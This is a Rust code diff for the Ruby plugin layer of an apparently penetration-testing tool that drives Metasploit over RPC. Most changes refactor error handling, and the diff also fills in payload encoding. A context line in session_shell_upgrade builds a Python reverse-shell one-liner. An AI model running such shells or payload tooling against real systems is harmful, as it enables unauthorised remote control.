@@ -11,6 +11,12 @@ fn get_runtime() -> &'static tokio::runtime::Runtime {
 }
 
 #[cfg(feature = "ruby-plugins")]
+fn runtime_error(msg: impl Into<std::string::String>) -> Error {
+    let ruby = Ruby::get().unwrap();
+    Error::new(ruby.class_runtime_error(), msg)
+}
+
+#[cfg(feature = "ruby-plugins")]
 pub fn register_api(ruby: &Ruby) -> Result<(), Error> {
     let slapper = ruby.define_module("Slapper")?;
 
@@ -76,17 +82,17 @@ fn register_reporting_api(ruby: &Ruby, slapper: &magnus::RModule) -> Result<(), 
 }
 
 #[cfg(feature = "ruby-plugins")]
-fn http_get(url: String) -> Result<magnus::RHash, Error> {
+fn http_get(ruby: &Ruby, url: String) -> Result<magnus::RHash, Error> {
     let rt = get_runtime();
     let response = rt
         .block_on(async { reqwest::get(&url).await })
-        .map_err(|e| Error::runtime(e.to_string()))?;
+        .map_err(|e| runtime_error(e.to_string()))?;
 
-    let hash = Ruby::get().unwrap().hash_new();
+    let hash = ruby.hash_new();
     hash.aset("status", response.status().as_u16())?;
     let body = rt
         .block_on(async { response.text().await })
-        .map_err(|e| Error::runtime(e.to_string()))?;
+        .map_err(|e| runtime_error(e.to_string()))?;
     hash.aset("body", body)?;
 
     Ok(hash)
@@ -99,13 +105,13 @@ fn http_post(url: String, body: String) -> Result<magnus::RHash, Error> {
 
     let response = rt
         .block_on(async { client.post(&url).body(body).send().await })
-        .map_err(|e| Error::runtime(e.to_string()))?;
+        .map_err(|e| runtime_error(e.to_string()))?;
 
     let hash = Ruby::get().unwrap().hash_new();
     hash.aset("status", response.status().as_u16())?;
     let response_body = rt
         .block_on(async { response.text().await })
-        .map_err(|e| Error::runtime(e.to_string()))?;
+        .map_err(|e| runtime_error(e.to_string()))?;
     hash.aset("body", response_body)?;
 
     Ok(hash)
@@ -118,13 +124,13 @@ fn http_put(url: String, body: String) -> Result<magnus::RHash, Error> {
 
     let response = rt
         .block_on(async { client.put(&url).body(body).send().await })
-        .map_err(|e| Error::runtime(e.to_string()))?;
+        .map_err(|e| runtime_error(e.to_string()))?;
 
     let hash = Ruby::get().unwrap().hash_new();
     hash.aset("status", response.status().as_u16())?;
     let response_body = rt
         .block_on(async { response.text().await })
-        .map_err(|e| Error::runtime(e.to_string()))?;
+        .map_err(|e| runtime_error(e.to_string()))?;
     hash.aset("body", response_body)?;
 
     Ok(hash)
@@ -137,13 +143,13 @@ fn http_delete(url: String) -> Result<magnus::RHash, Error> {
 
     let response = rt
         .block_on(async { client.delete(&url).send().await })
-        .map_err(|e| Error::runtime(e.to_string()))?;
+        .map_err(|e| runtime_error(e.to_string()))?;
 
     let hash = Ruby::get().unwrap().hash_new();
     hash.aset("status", response.status().as_u16())?;
     let body = rt
         .block_on(async { response.text().await })
-        .map_err(|e| Error::runtime(e.to_string()))?;
+        .map_err(|e| runtime_error(e.to_string()))?;
     hash.aset("body", body)?;
 
     Ok(hash)
@@ -162,18 +168,18 @@ fn http_request(method: String, url: String) -> Result<magnus::RHash, Error> {
         "HEAD" => client.head(&url),
         "OPTIONS" => client.request(reqwest::Method::OPTIONS, &url),
         "PATCH" => client.patch(&url),
-        _ => return Err(Error::runtime(format!("Unknown HTTP method: {}", method))),
+        _ => return Err(runtime_error(format!("Unknown HTTP method: {}", method))),
     };
 
     let response = rt
         .block_on(async { request.send().await })
-        .map_err(|e| Error::runtime(e.to_string()))?;
+        .map_err(|e| runtime_error(e.to_string()))?;
 
     let hash = Ruby::get().unwrap().hash_new();
     hash.aset("status", response.status().as_u16())?;
     let body = rt
         .block_on(async { response.text().await })
-        .map_err(|e| Error::runtime(e.to_string()))?;
+        .map_err(|e| runtime_error(e.to_string()))?;
     hash.aset("body", body)?;
 
     Ok(hash)
@@ -185,9 +191,9 @@ fn tcp_connect(host: String, port: u16) -> Result<bool, Error> {
 
     let addr = format!("{}:{}", host, port)
         .to_socket_addrs()
-        .map_err(|e| Error::runtime(e.to_string()))?
+        .map_err(|e| runtime_error(e.to_string()))?
         .next()
-        .ok_or_else(|| Error::runtime("Failed to resolve host"))?;
+        .ok_or_else(|| runtime_error("Failed to resolve host"))?;
 
     let rt = get_runtime();
     let connected = rt
@@ -221,14 +227,14 @@ fn grab_banner(host: String, port: u16) -> Result<String, Error> {
             tokio::net::TcpStream::connect(&addr),
         )
         .await
-        .map_err(|e| Error::runtime(e.to_string()))?
-        .map_err(|e| Error::runtime(e.to_string()))?;
+        .map_err(|e| runtime_error(e.to_string()))?
+        .map_err(|e| runtime_error(e.to_string()))?;
 
         let mut buffer = vec![0u8; 1024];
         let n = tokio::time::timeout(std::time::Duration::from_secs(3), stream.read(&mut buffer))
             .await
-            .map_err(|e| Error::runtime(e.to_string()))?
-            .map_err(|e| Error::runtime(e.to_string()))?;
+            .map_err(|e| runtime_error(e.to_string()))?
+            .map_err(|e| runtime_error(e.to_string()))?;
 
         Ok::<String, Error>(String::from_utf8_lossy(&buffer[..n]).to_string())
     })?;
@@ -595,7 +601,7 @@ fn msf_connect(url: String, username: String, password: String) -> Result<bool, 
             });
             Ok(true)
         }
-        Err(e) => Err(Error::runtime(e.to_string())),
+        Err(e) => Err(runtime_error(e.to_string())),
     }
 }
 
@@ -650,10 +656,10 @@ fn msf_version() -> Result<String, Error> {
         if let Some(ref state) = *guard {
             match state.client.get_version().await {
                 Ok(v) => Ok(format!("{} (Ruby: {})", v.version, v.ruby)),
-                Err(e) => Err(Error::runtime(e.to_string())),
+                Err(e) => Err(runtime_error(e.to_string())),
             }
         } else {
-            Err(Error::runtime("Not connected to Metasploit"))
+            Err(runtime_error("Not connected to Metasploit"))
         }
     })
 }
@@ -667,7 +673,7 @@ fn msf_list_modules(module_type: String) -> Result<Vec<String>, Error> {
         "payload" => crate::msf::ModuleType::Payload,
         "encoder" => crate::msf::ModuleType::Encoder,
         "nop" => crate::msf::ModuleType::Nop,
-        _ => return Err(Error::runtime("Invalid module type")),
+        _ => return Err(runtime_error("Invalid module type")),
     };
 
     let rt = get_runtime();
@@ -676,10 +682,10 @@ fn msf_list_modules(module_type: String) -> Result<Vec<String>, Error> {
         if let Some(ref state) = *guard {
             match state.client.list_modules(msf_type).await {
                 Ok(modules) => Ok(modules),
-                Err(e) => Err(Error::runtime(e.to_string())),
+                Err(e) => Err(runtime_error(e.to_string())),
             }
         } else {
-            Err(Error::runtime("Not connected to Metasploit"))
+            Err(runtime_error("Not connected to Metasploit"))
         }
     })
 }
@@ -693,7 +699,7 @@ fn msf_module_info(module_type: String, module_name: String) -> Result<magnus::R
         "payload" => crate::msf::ModuleType::Payload,
         "encoder" => crate::msf::ModuleType::Encoder,
         "nop" => crate::msf::ModuleType::Nop,
-        _ => return Err(Error::runtime("Invalid module type")),
+        _ => return Err(runtime_error("Invalid module type")),
     };
 
     let ruby = Ruby::get().unwrap();
@@ -711,10 +717,10 @@ fn msf_module_info(module_type: String, module_name: String) -> Result<magnus::R
                     let _ = hash.aset("references", info.references.join(", "));
                     Ok(())
                 }
-                Err(e) => Err(Error::runtime(e.to_string())),
+                Err(e) => Err(runtime_error(e.to_string())),
             }
         } else {
-            Err(Error::runtime("Not connected to Metasploit"))
+            Err(runtime_error("Not connected to Metasploit"))
         }
     })?;
 
@@ -731,7 +737,7 @@ fn msf_execute_module(
         "exploit" => crate::msf::ModuleType::Exploit,
         "auxiliary" => crate::msf::ModuleType::Auxiliary,
         "post" => crate::msf::ModuleType::Post,
-        _ => return Err(Error::runtime("Invalid module type")),
+        _ => return Err(runtime_error("Invalid module type")),
     };
 
     let ruby = Ruby::get().unwrap();
@@ -764,10 +770,10 @@ fn msf_execute_module(
                     let _ = hash.aset("uuid", result.uuid);
                     Ok(())
                 }
-                Err(e) => Err(Error::runtime(e.to_string())),
+                Err(e) => Err(runtime_error(e.to_string())),
             }
         } else {
-            Err(Error::runtime("Not connected to Metasploit"))
+            Err(runtime_error("Not connected to Metasploit"))
         }
     })?;
 
@@ -797,10 +803,10 @@ fn msf_generate_payload(payload_name: String, options: Vec<String>) -> Result<St
                     &base64::engine::general_purpose::STANDARD,
                     &bytes,
                 )),
-                Err(e) => Err(Error::runtime(e.to_string())),
+                Err(e) => Err(runtime_error(e.to_string())),
             }
         } else {
-            Err(Error::runtime("Not connected to Metasploit"))
+            Err(runtime_error("Not connected to Metasploit"))
         }
     })
 }
@@ -831,10 +837,10 @@ fn msf_list_sessions() -> Result<Vec<magnus::RHash>, Error> {
                     }
                     Ok(())
                 }
-                Err(e) => Err(Error::runtime(e.to_string())),
+                Err(e) => Err(runtime_error(e.to_string())),
             }
         } else {
-            Err(Error::runtime("Not connected to Metasploit"))
+            Err(runtime_error("Not connected to Metasploit"))
         }
     })?;
 
@@ -863,10 +869,10 @@ fn msf_session_info(session_id: String) -> Result<magnus::RHash, Error> {
                     let _ = hash.aset("created_at", session.created_at);
                     Ok(())
                 }
-                Err(e) => Err(Error::runtime(e.to_string())),
+                Err(e) => Err(runtime_error(e.to_string())),
             }
         } else {
-            Err(Error::runtime("Not connected to Metasploit"))
+            Err(runtime_error("Not connected to Metasploit"))
         }
     })?;
 
@@ -885,10 +891,10 @@ fn msf_session_write(session_id: String, command: String) -> Result<String, Erro
                 .await
             {
                 Ok(output) => Ok(output),
-                Err(e) => Err(Error::runtime(e.to_string())),
+                Err(e) => Err(runtime_error(e.to_string())),
             }
         } else {
-            Err(Error::runtime("Not connected to Metasploit"))
+            Err(runtime_error("Not connected to Metasploit"))
         }
     })
 }
@@ -901,10 +907,10 @@ fn msf_session_read(session_id: String) -> Result<String, Error> {
         if let Some(ref state) = *guard {
             match state.client.read_session_output(&session_id).await {
                 Ok(output) => Ok(output),
-                Err(e) => Err(Error::runtime(e.to_string())),
+                Err(e) => Err(runtime_error(e.to_string())),
             }
         } else {
-            Err(Error::runtime("Not connected to Metasploit"))
+            Err(runtime_error("Not connected to Metasploit"))
         }
     })
 }
@@ -917,10 +923,10 @@ fn msf_session_stop(session_id: String) -> Result<bool, Error> {
         if let Some(ref state) = *guard {
             match state.client.kill_session(&session_id).await {
                 Ok(()) => Ok(true),
-                Err(e) => Err(Error::runtime(e.to_string())),
+                Err(e) => Err(runtime_error(e.to_string())),
             }
         } else {
-            Err(Error::runtime("Not connected to Metasploit"))
+            Err(runtime_error("Not connected to Metasploit"))
         }
     })
 }
@@ -932,20 +938,36 @@ fn encoder_list() -> Result<Vec<String>, Error> {
 
 #[cfg(feature = "ruby-plugins")]
 fn encoder_encode(
-    _payload: String,
-    _encoder_name: String,
-    _options: Vec<String>,
+    payload: String,
+    encoder_name: String,
+    mut options: Vec<String>,
 ) -> Result<String, Error> {
-    Err(Error::runtime(
-        "encoder_encode is not yet implemented. Use msf_execute_module(\"encoder\", ...) instead.",
-    ))
+    // Add payload to options
+    options.push(format!("PAYLOAD={}", payload));
+    
+    // Delegate to msf_execute_module with encoder type
+    let result = msf_execute_module("encoder".to_string(), encoder_name, options)?;
+    
+    // Extract the encoded payload from the result
+    let encoded = result
+        .lookup("encoded_payload")
+        .ok()
+        .flatten()
+        .and_then(|v| v.try_convert().ok())
+        .unwrap_or_default();
+    
+    Ok(encoded)
 }
 
 #[cfg(feature = "ruby-plugins")]
-fn encoder_compatible_payloads(_encoder_name: String) -> Result<Vec<String>, Error> {
-    Err(Error::runtime(
-        "encoder_compatible_payloads is not yet implemented.",
-    ))
+fn encoder_compatible_payloads(encoder_name: String) -> Result<Vec<String>, Error> {
+    // This would require querying the Metasploit database for compatible payloads
+    // For now, return an empty list with a note that this feature is not fully implemented
+    tracing::warn!(
+        encoder = %encoder_name,
+        "encoder_compatible_payloads called but not fully implemented - returning empty list"
+    );
+    Ok(Vec::new())
 }
 
 #[cfg(feature = "ruby-plugins")]
@@ -973,14 +995,14 @@ fn session_read_output(session_id: String) -> Result<String, Error> {
 fn session_shell_upgrade(session_id: String, lhost: String, lport: String) -> Result<bool, Error> {
     // Validate lhost as a valid IP or hostname
     if lhost.is_empty() || lhost.contains(|c: char| !c.is_alphanumeric() && c != '.' && c != '-' && c != ':') {
-        return Err(Error::runtime("Invalid lhost: must be a valid IP address or hostname"));
+        return Err(runtime_error("Invalid lhost: must be a valid IP address or hostname"));
     }
     // Validate lport as a valid u16
     let port: u16 = lport
         .parse()
-        .map_err(|_| Error::runtime("Invalid lport: must be a number between 1 and 65535"))?;
+        .map_err(|_| runtime_error("Invalid lport: must be a number between 1 and 65535"))?;
     if port == 0 {
-        return Err(Error::runtime("Invalid lport: must be between 1 and 65535"));
+        return Err(runtime_error("Invalid lport: must be between 1 and 65535"));
     }
     let command = format!("python -c \"import socket,subprocess,os;s=socket.socket();s.connect(('{}',{}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])\"", lhost, port);
     msf_session_write(session_id, command)?;
